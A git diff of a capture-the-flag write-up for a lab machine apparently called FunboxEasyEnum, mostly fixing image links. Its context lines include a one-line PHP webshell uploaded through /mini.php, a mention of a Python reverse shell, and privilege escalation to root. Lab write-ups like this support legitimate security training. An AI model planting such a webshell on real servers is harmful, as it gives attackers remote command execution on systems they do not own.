@@ -38,17 +38,19 @@ SCanning for idrectories we find `/mini.php`
 
 ![pg_fbee_dirs.png](../assets/funboxeasyenum_assets/pg_fbee_dirs.png)
 
+![pg_fbee_mini.png](../assets/funboxeasyenum_assets/pg_fbee_mini.png)
+
 We can upload a simple webshell:
 
 ```php
 <?php system($_GET["cmd"]); ?>
 ```
 
-pg_fbee_cmd.png
+![pg_fbee_cmd.png](../assets/funboxeasyenum_assets/pg_fbee_cmd.png)
 
 And confirm execution
 
-pg_fbee_id.png
+![pg_fbee_id.png](../assets/funboxeasyenum_assets/pg_fbee_id_.png)
 
 Lets issues a python3 reverse shell one liner:
 
@@ -73,7 +75,7 @@ funbox7
 
 We can then grab the loacl.txt flag in `/var/www`
 
-pg_fbee_local.png
+![pg_fbee_local.png](../assets/funboxeasyenum_assets/pg_fbee_local.png)
 
 ### Privilege Escalation
 
@@ -159,7 +161,7 @@ root
 
 And grab the final flag:
 
-pg_fbee_root.png
+![pg_fbee_root.png](../assets/funboxeasyenum_assets/pg_fbee_root.png)
 
 Thanks for following along!
 
